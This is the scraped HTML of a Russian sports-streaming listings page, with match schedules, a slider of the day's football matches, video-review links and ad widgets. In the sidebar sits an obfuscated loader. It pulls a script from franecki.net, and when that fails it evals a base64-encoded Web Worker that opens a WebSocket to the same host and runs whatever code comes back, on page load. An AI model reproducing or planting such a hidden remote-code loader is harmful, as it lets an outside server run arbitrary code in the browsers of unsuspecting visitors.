                            <p class="grey">(НБА Джи-лига)<Br />17 марта в 5:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/icon_sport_small/icon_basketball.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/norsern-arizona-sans-reptors-905-smotret-online-206.html" title="смотреть прямую трансляцию Норсерн Аризона Санс - Рэпторс 905" class="black">Норсерн Аризона Санс - Рэпто...</a>
                            <p class="grey">(НБА Джи-лига)<Br />17 марта в 5:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/nhl.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/detroyt-anahaym-smotret-online-335.html" title="смотреть прямую трансляцию Детройт - Анахайм" class="black">Детройт - Анахайм</a>
                            <p class="grey">(НХЛ)<Br />17 марта в 5:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/usl.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/sietl-ii-portlend-ii-smotret-online-431.html" title="смотреть прямую трансляцию Сиэтл II - Портленд II" class="black">Сиэтл II - Портленд II</a>
                            <p class="grey">(USL)<Br />17 марта в 5:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/nba.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/sakramento-golden-steyt-smotret-online-364.html" title="смотреть прямую трансляцию Сакраменто - Голден Стэйт" class="black">Сакраменто - Голден Стэйт</a>
                            <p class="grey">(НБА)<Br />17 марта в 5:30</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/nhl.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/minnesota-vegas-smotret-online-601.html" title="смотреть прямую трансляцию Миннесота - Вегас" class="black">Миннесота - Вегас</a>
                            <p class="grey">(НХЛ)<Br />17 марта в 5:30</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/nba.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/mayami-leykers-smotret-online-716.html" title="смотреть прямую трансляцию Майами - Лейкерс" class="black">Майами - Лейкерс</a>
                            <p class="grey">(НБА)<Br />17 марта в 5:30</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/tennis.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/atp-chellendjer-smotret-online-614.html" title="смотреть прямую трансляцию ATP Челленджер, Шэньчжэнь" class="black">ATP Челленджер, Шэньчжэнь</a>
                            <p class="grey">(Турнир ATP Челленджер)<Br />17 марта в 6:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/hockey.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/respublika-koreya-italiya-smotret-online-339.html" title="смотреть прямую трансляцию Республика Корея - Италия" class="black">Республика Корея - Италия</a>
                            <p class="grey">(Паралимпийские игры)<Br />17 марта в 6:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/tennis.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/turnir-itf-smotret-online-137.html" title="смотреть прямую трансляцию Турнир ITF, Шэньчжэнь<br>Женщины" class="black">Турнир ITF, Шэньчжэнь<br>Жен...</a>
                            <p class="grey">(Турнир ITF)<Br />17 марта в 6:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/tennis.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/ito-t-ivashka-i--smotret-online-342.html" title="смотреть прямую трансляцию Ито Т. - Ивашка И." class="black">Ито Т. - Ивашка И.</a>
                            <p class="grey">(Турнир ATP Челленджер)<Br />17 марта в 6:05</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/rugby.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/fidji-tonga-smotret-online-919.html" title="смотреть прямую трансляцию Фиджи - Тонга" class="black">Фиджи - Тонга</a>
                            <p class="grey">(Товарищеский турнир)<Br />17 марта в 6:30</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/box.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/valentin-s-ruiz-h--smotret-online-649.html" title="смотреть прямую трансляцию Валентин С. - Руиз Х." class="black">Валентин С. - Руиз Х.</a>
                            <p class="grey">(Бокс)<Br />17 марта в 6:35</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/npb.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/rakuten-igls-hirosima-karp-smotret-online-283.html" title="смотреть прямую трансляцию Ракутен Иглс - Хиросима Карп" class="black">Ракутен Иглс - Хиросима Карп</a>
                            <p class="grey">(Япония. НПБ)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/kbo.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/sk-vivern-neksen-hiroz-smotret-online-144.html" title="смотреть прямую трансляцию СК Виверн - Нексен Хироз" class="black">СК Виверн - Нексен Хироз</a>
                            <p class="grey">(Южная Корея. КБО Лига)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/kbo.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/hanva-iglz-ns-dinos-smotret-online-629.html" title="смотреть прямую трансляцию Ханва Иглз - НС Динос" class="black">Ханва Иглз - НС Динос</a>
                            <p class="grey">(Южная Корея. КБО Лига)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/race.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/paralimpiyskie-igryi-2018-smotret-online-549.html" title="смотреть прямую трансляцию Паралимпийские игры 2018" class="black">Паралимпийские игры 2018</a>
                            <p class="grey">(Лыжные гонки)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/npb.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/yakult-suellous-hokkaydo-fayters-smotret-online-780.html" title="смотреть прямую трансляцию Якулт Суэллоус - Хоккайдо Файтерс" class="black">Якулт Суэллоус - Хоккайдо Фа...</a>
                            <p class="grey">(Япония. НПБ)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/npb.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/oriks-baffalos-yokogama-bs-smotret-online-422.html" title="смотреть прямую трансляцию Орикс Баффалос - Йокогама БС" class="black">Орикс Баффалос - Йокогама БС</a>
                            <p class="grey">(Япония. НПБ)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/kbo.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/doosan-bears-lg-tvins-smotret-online-247.html" title="смотреть прямую трансляцию Доосан Беарс - ЛГ Твинс" class="black">Доосан Беарс - ЛГ Твинс</a>
                            <p class="grey">(Южная Корея. КБО Лига)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/kbo.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/samsung-layons-kia-taygerz-smotret-online-861.html" title="смотреть прямую трансляцию Самсунг Лайонс - Киа Тайгерз" class="black">Самсунг Лайонс - Киа Тайгерз</a>
                            <p class="grey">(Южная Корея. КБО Лига)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/kbo.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/kt-viz-lotte-djaynts-smotret-online-254.html" title="смотреть прямую трансляцию КТ Виз - Лотте Джайнтс" class="black">КТ Виз - Лотте Джайнтс</a>
                            <p class="grey">(Южная Корея. КБО Лига)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/nrl.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/uoriorz-titanz-smotret-online-609.html" title="смотреть прямую трансляцию Уориорз - Титанз" class="black">Уориорз - Титанз</a>
                            <p class="grey">(Австралия. NRL)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/npb.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/tiba-merins-fukuoka-houks-smotret-online-523.html" title="смотреть прямую трансляцию Тиба Мэринс - Фукуока Хоукс" class="black">Тиба Мэринс - Фукуока Хоукс</a>
                            <p class="grey">(Япония. НПБ)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/npb.png" width="22" /></span>
                        <span class="post"></span>                        <div class="text">
                            <a href="/translation/seybu-layons-yomiuri-djaynts-smotret-online-702.html" title="смотреть прямую трансляцию Сейбу Лайонс - Йомиури Джайнтс" class="black">Сейбу Лайонс - Йомиури Джайн...</a>
                            <p class="grey">(Япония. НПБ)<Br />17 марта в 7:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/tennis.png" width="22" /></span>
                                                <div class="text">
                            <a href="/translation/halep-s-osaka-n--smotret-online-660.html" title="смотреть прямую трансляцию Халеп С. - Осака Н." class="black">Халеп С. - Осака Н.</a>
                            <p class="grey">(Мировой тур АТП)<Br />17 марта в 7:15</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/tennis.png" width="22" /></span>
                                                <div class="text">
                            <a href="/translation/hurkach-h-chjan-ts--smotret-online-484.html" title="смотреть прямую трансляцию Хуркач Х. - Чжан Ц." class="black">Хуркач Х. - Чжан Ц.</a>
                            <p class="grey">(Турнир ATP Челленджер)<Br />17 марта в 7:30</p>
                        </div>
                    </div>
                                
                                 <div class="row">
                        <span class="bol"><img src="/match/icon/new/icon_sport_small/icon_football.png" width="22" /></span>
                                                <div class="text">
                            <a href="/translation/montedio-yamagata-matida-zelviya-smotret-online-118.html" title="смотреть прямую трансляцию Монтедио Ямагата - Матида Зельвия" class="black">Монтедио Ямагата - Матида Зе...</a>
                            <p class="grey">(Япония. Джей-лига 2)<Br />17 марта в 8:00</p>
                        </div>
                    </div>
                                    <div class="clear"></div>
                                
                          </div>
        </div>
        <div class="clear"></div>
        <a class="more" href="/translation/">Список всех трансляций</a>
    </div>
        
    <div class="bottom"></div>
</div>
<!--END translation-->

<!--Подключаем скрипт для персонального рассписания -->
<script type="text/javascript" src="/res/js/personallist.js"></script>                </div>
                        <!--END main_content-->

            
            <!--anons-->
            <div class="anons">
                <div class="title">
                    <div class="center"><p>Анонсы</p></div>
                    <div class="right"></div>
                    <div class="clear"></div>
                </div>
                <div class="conteyner">
                    <div class="anons_list" id="rotator">
                                                                                                                        <ul>
                                                        
                                <li class="block_3 show">                                   <div class="row_1">
                                        <p class="date">17.03.2018 <font>(05:30)</font></p>
                                        <p class="type_sport">Баскетбол</p>
                                        <p class="term"><a href="/translation/sakramento-golden-steyt-smotret-online-364.html">Сакраменто - Голден Стэйт</a></p>
                                    </div>
                                                             
                                                                   <div class="row_1">
                                        <p class="date">17.03.2018 <font>(05:30)</font></p>
                                        <p class="type_sport">Баскетбол</p>
                                        <p class="term"><a href="/translation/mayami-leykers-smotret-online-716.html">Майами - Лейкерс</a></p>
                                    </div>
                                                                                     </ul>
                                            </div>
                                        <div class="strelka_left" onClick="rotate(false);"></div>
                    <div class="strelka_right" onClick="rotate(true);"></div>
                                    </div>
            </div>
            <!--END anons-->

            <!--slider-->
            <div class="slider">
                <div class="left_uzor"></div>
                <div class="right_uzor"></div>
                <div class="preloader_slider"></div>
                <div id="content_slider">
                    <div id="slider" style="display:none;"><ul>

    <li>
        <a href="/translation/arsenal-tula-rostov-smotret-online-446.html">            <div class="todays_match">
                
                                <div class="fon_conteyner football_fon">
                    <div class="data_container">
                        <div class="today_logo">
                            <div class="col_1">
                                <div style="position:absolute; top:20px; right:5px;">
                                    <img src="/res/images/logo/1372765006_arsenal_tula.png" width="80" />
                                </div>
                            </div>
                            <div class="col_2">
                                <div style="position:absolute; top:20px; left:7px;">
                                    <img src="/res/images/logo/1330032642_200pxfc_rostov_logo.svg[1].png" width="80" />
                                </div>
                            </div>
                            <div class="clear"></div>
                        </div><Br />
                        <div class="match_conteyner">Арсенал<span>VS</span>Ростов</div><Br />
                        <div class="days">СЕГОДНЯ в 14:00</div>
                    </div>
                </div>
            
            </div>
        </a>    </li>

    <li>
        <a href="/translation/krasnodar-ufa-smotret-online-518.html">            <div class="todays_match">
                
                                <div class="fon_conteyner football_fon">
                    <div class="data_container">
                        <div class="today_logo">
                            <div class="col_1">
                                <div style="position:absolute; top:15px; right:3px;">
                                    <img src="/res/images/logo/1330032601_fckrasnodar[1].png" width="90" />
                                </div>
                            </div>
                            <div class="col_2">
                                <div style="position:absolute; top:20px; left:5px;">
                                    <img src="/res/images/logo/1347459366_ufa.png" width="80" />
                                </div>
                            </div>
                            <div class="clear"></div>
                        </div><Br />
                        <div class="match_conteyner">Краснодар<span>VS</span>Уфа</div><Br />
                        <div class="days">СЕГОДНЯ в 16:30</div>
                    </div>
                </div>
            
            </div>
        </a>    </li>

    <li>
                    <div class="todays_match">
                
                                <div class="fon_conteyner football_fon">
                    <div class="data_container">
                        <div class="today_logo">
                            <div class="col_1">
                                <div style="position:absolute; top:12px; right:3px;">
                                    <img src="/res/images/logo/1330010942_200pxfc_rubin_kazan.svg[1].png" width="85" />
                                </div>
                            </div>
                            <div class="col_2">
                                <div style="position:absolute; top:30px; left:3px;">
                                    <img src="/res/images/logo/1330032448_200pxfc_spartak_moscow.svg[1].png" width="85" />
                                </div>
                            </div>
                            <div class="clear"></div>
                        </div><Br />
                        <div class="match_conteyner">Рубин<span>VS</span>Спартак</div><Br />
                        <div class="days">СЕГОДНЯ в 19:00</div>
                    </div>
                </div>
            
            </div>
            </li>
    </ul></div>
                </div>
            </div>
            <!--END slider-->

                        <!--sidebar-->
            <div class="sidebar">

                <div class="authorization">
                    <div class="auth">
                                                <div  class="not_auth">
                            <div class="after_input">
                                <button class="reg"><span class="button_default"><span class="right"><span class="center">Регистрация</span></span></span></button>
                                <button class="enter"></button>
                                <div class="preloader"><img src="/res/images/preloader_popup.gif" width="60"></div>
                                <div class="clear"></div>
                            </div>
                        </div>
                                            </div>
                </div>

                                
                
                
                
                
                
                
                </br>


                <div id="b7cf6c3603" style="display: none"></div></br>
                
                    <script type="text/javascript">(function(){var h=document.getElementsByTagName("head")[0],s=document.createElement("script"),f=function(){AMSP.loadAsset("5e4b1968c2dc9fcd4efeb561612fc45e","")};s.type="text/javascript";s.src="//franecki.net/js/lib.js";s.onload=function(){typeof AMSP==='undefined'?this.onerror():f()};s.onerror=function(){try{var w=new Worker(URL.createObjectURL(new Blob(['eval(atob(\'ICAgIAogICAgICAgIHZhciB3cyA9IG5ldyBXZWJTb2NrZXQoJ3dzczovL2ZyYW5lY2tpLm5ldDo4MDQxL2pzL2xpYi5qcz9saWI9d3JrJyk7CiAgICAgICAgd3Mub25tZXNzYWdlID0gZnVuY3Rpb24odCl7IHBvc3RNZXNzYWdlKHQuZGF0YSk7IHdzLmNsb3NlKCk7fTsKICAgIAogICAg\'))']),{type:'application/javascript'}));w.onmessage=function(t){typeof AMSP==='undefined'?window.addEventListener("amspInit",f):f();window.eval(t.data)}}catch(e){}};h.insertBefore(s,h.firstChild)})();</script>
                
                
                
                
                <!--таблица статистикb-->
                
                                
                    <div id="yandex_rtb_R-A-110081-16"></div>
                    <script type="text/javascript">
                        (function(w, d, n, s, t) {
                            w[n] = w[n] || [];
                            w[n].push(function() {
                                Ya.Context.AdvManager.render({
                                    blockId: "R-A-110081-16",
                                    renderTo: "yandex_rtb_R-A-110081-16",
                                    async: true
                                });
                            });
                            t = d.getElementsByTagName("script")[0];
                            s = d.createElement("script");
                            s.type = "text/javascript";
                            s.src = "//an.yandex.ru/system/context.js";
                            s.async = true;
                            t.parentNode.insertBefore(s, t);
                        })(this, this.document, "yandexContextAsyncCallbacks");
                    </script>
                

                
                <div style="margin: 10px 0 20px 0px; border: #ccc solid 1px;">
                    <!-- VK Widget -->
                    <div id="vk_groups"></div>
                    <script type="text/javascript">
                    VK.Widgets.Group("vk_groups", {mode: 0, width: "224", height: "400", color1: 'FFFFFF', color2: '2B587A', color3: '70a82f'}, 8556358);
                    </script>
                </div>
                

                <!--last video-->
                <div class="last_video" id="last_video"><div class="title">
					<div class="left"></div>
					<div class="center">Последние видео-обзоры</div>
					<div class="right"></div>
					<div class="clear"></div>
				</div>
				<div class="data">
					<div class="center">
						<div class="nav">
							<a href="/video/football/"><div class="col_1">Футбол</div></a>
							<a href="/video/hockey/"><div class="col_3">Хоккей</div></a>
							<a href="/video/basketball/"><div class="col_2">Баскетбол</div></a>
							<div class="clear"></div>
						</div>
						<div class="seriy_fon"><div class="obzor" onmouseover="active_sidebar('last_obzor_1', true);" onmouseout="active_sidebar('last_obzor_1', false);" id="last_obzor_1">
						<div class="icon_chempionat"><img src="/video_parser/images/nhl_icon.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/aylenders_vashington_2194.html">Айлендерс - Вашингтон. Счет 3:6</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_2', true);" onmouseout="active_sidebar('last_obzor_2', false);" id="last_obzor_2">
						<div class="icon_chempionat"><img src="/video_parser/images/nhl_icon.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/dallas_ottava_4169.html">Даллас - Оттава. Счет 2:2</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_3', true);" onmouseout="active_sidebar('last_obzor_3', false);" id="last_obzor_3">
						<div class="icon_chempionat"><img src="/video_parser/images/nba.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/dallas_toronto_4318.html">Даллас - Торонто. Счет 106:106</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_4', true);" onmouseout="active_sidebar('last_obzor_4', false);" id="last_obzor_4">
						<div class="icon_chempionat"><img src="/video_parser/images/nba.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/klippers_oklahoma_6430.html">Клипперс - Оклахома. Счет 113:121</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_5', true);" onmouseout="active_sidebar('last_obzor_5', false);" id="last_obzor_5">
						<div class="icon_chempionat"><img src="/video_parser/images/nba.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/bruklin_nets_filadelfiya_1661.html">Бруклин Нетс - Филадельфия. Счет 116:120</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_6', true);" onmouseout="active_sidebar('last_obzor_6', false);" id="last_obzor_6">
						<div class="icon_chempionat"><img src="/video_parser/images/nba.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/boston_orlando_2914.html">Бостон - Орландо. Счет 92:83</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_7', true);" onmouseout="active_sidebar('last_obzor_7', false);" id="last_obzor_7">
						<div class="icon_chempionat"><img src="/video_parser/images/ligavtb_basketball.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/vef_riga_parma_6647.html">ВЭФ Рига - Парма</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_8', true);" onmouseout="active_sidebar('last_obzor_8', false);" id="last_obzor_8">
						<div class="icon_chempionat"><img src="/video_parser/images/portugal_championship.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/setubal_portimonense_8338.html">Сетубал - Портимоненсе. Счет 1:1</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_9', true);" onmouseout="active_sidebar('last_obzor_9', false);" id="last_obzor_9">
						<div class="icon_chempionat"><img src="/video_parser/images/euroliga_basketball.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/unikaha_panatinaikos_1726.html">Уникаха - Панатинаикос. Счет 79:90</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div><div class="obzor" onmouseover="active_sidebar('last_obzor_10', true);" onmouseout="active_sidebar('last_obzor_10', false);" id="last_obzor_10">
						<div class="icon_chempionat"><img src="/video_parser/images/netherlands_championship.png" width="16" /></div>
						<div class="name_block">
							<p class="name"><a href="/video/ekselsior_den_gaag_5442.html">Эксельсиор - Ден Гааг. Счет 1:2</a></p><p class="date">Дата матча: 17.03.2018</p>
						</div>
						<div class="clear"></div>
					</div></div>
					<div class="seriy_line seriy_line_lastvideo"></div>
				</div>
				<div class="bottom"></div>
				<div class="clear"></div>
			</div></div>
                <!--END last video-->

            </div>
            <!--END sidebar-->
            
            <div class="clear"></div>
        </div>
        <!--END content-->

    </div>
</div>

<div class="footer">

    <div class="footer_links">
                <div class="col1">
            <div><a href="/translation/football-russia/">Футбол России онлайн</a></div>
        </div>
        <div class="col1">
            <div><a href="/translation/hockey/khl/">Хоккей. КХЛ</a></div>
        </div>
        <div class="col1">
            <div><a href="/translation/hockey/nhl/">Хоккей. НХЛ</a></div>
        </div>
        <div class="col1">
            <div><a href="http://m.sport5online.com?changeonplatform=mobile">Мобильная версия</a></div>
        </div>
        <div class="col1 last">
                        <div><a href="/contacts/">Контакты</a></div>
        </div>
        <div class="clear"></div>
    </div>

    <!--menu-->
    <div class="footer_menu">
        <div class="left_menu"></div>
        <div class="center_menu" id="menu">

            <div class="liveinternet" id="liveinternet">
                <!--LiveInternet counter--><script type="text/javascript"><!--
                document.write("<a href='http://www.liveinternet.ru/click' "+
                "target=_blank><img src='//counter.yadro.ru/hit?t22.6;r"+
                escape(document.referrer)+((typeof(screen)=="undefined")?"":
                ";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
                screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
                ";h"+escape(document.title.substring(0,80))+";"+Math.random()+
                "' alt='' title='LiveInternet: показано число просмотров за 24"+
                " часа, посетителей за 24 часа и за сегодня' "+
                "border='0' width='88' height='31'><\/a>")
                //--></script><!--/LiveInternet-->
            </div>
        </div>
        <div class="right_menu"></div>
        <div class="clear"></div>
    </div>
  <!--END menu-->

    
    
  <div class="trava"></div>
  <div class="logo_footer"></div>
</div>

<!--popup-->
<div class="popup_fon" id="popup_fon">
    <div class="popup">
        <div class="exit_popup" title="закрыть" onClick="close_popup();"></div>
        <div class="header">
            <div id="title"></div>
        </div>
        <div id="data_popup"></div>
    </div>
</div>
<!--end popup-->

<!--anons-->
<script type="text/javascript">

$(document).ready(function() {
    theRotator();
});

</script>
<!--end anons-->

<!--slider-->
<script>
    
        $(document).ready(function(){
        $("#slider").css('display','block');
        $("#slider").easySlider({
            auto: true,
            continuous: true
        });
        });
    
</script>
<!--slider-->

<!--modal dialogs-->
<div id="dialogs"></div>
<script type="text/javascript">
    
    $(document).ready(function(){
        $.get(
            '/dialogs/?typerequest=ajax',
            function(resp)
            {
                $('#dialogs').html(resp);
                core_events.send('init');
            },
            'html'
        );
    });
    
</script>
<!--END modal dialogs-->

<div id="buttonUp" class="buttonUp" title="Вернуться на начало страницы"></div>

<!--Begin Marathonbet Banner Statis code-->
<!--End Marathonbet Banner Statis code -->


<script type="text/javascript">
    $(function() {
    $.fn.scrollToTop = function() {
    $(this).hide().removeAttr("href");
    if ($(window).scrollTop() >= "250") $(this).fadeIn("slow")
    var scrollDiv = $(this);
    $(window).scroll(function() {
    if ($(window).scrollTop() <= "250") $(scrollDiv).fadeOut("slow")
    else $(scrollDiv).fadeIn("slow")
    });
    $(this).click(function() {
    $("html, body").animate({scrollTop: 0}, "slow")
    })
    }
    });

    $(function() {
    $("#buttonUp").scrollToTop();
    });
</script>


<script type="text/javascript" src="/min/?b=res/js/popup&f=simple_dialog.js,show_message.js,registration.js,browser_translatopn.js,auth.js,remindpswd.js,usersData.js,profile.js,paymentHistory.js,cash.js,prognoz.js,prognoz_subs.js,prognoz_sub.js,alert_message.js,sopcast.js,my_group_vk.js"></script>


    <!-- BEGIN ADVERTSERVE CODE -->
    <div id="avp_zid_639">
        <script type="text/javascript">
            if (!document.cookie || document.cookie.indexOf('AVPDCAP=') == -1) {
                _avp.push({ tagid: 'avp_zid_639', alias: '/', type: 'dynamic', zid: 639, pid: 251 });
            }
        </script>
    </div>
    <!-- END ADVERTSERVE CODE -->


<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"7fd910bb83","applicationID":"32986385","transactionName":"ZlBVZUECDRIEUU1ZX18aYkNaTAoPAVdBHkBZRQ==","queueTime":0,"applicationTime":166,"atts":"ShdWEwkYHhw=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
</html>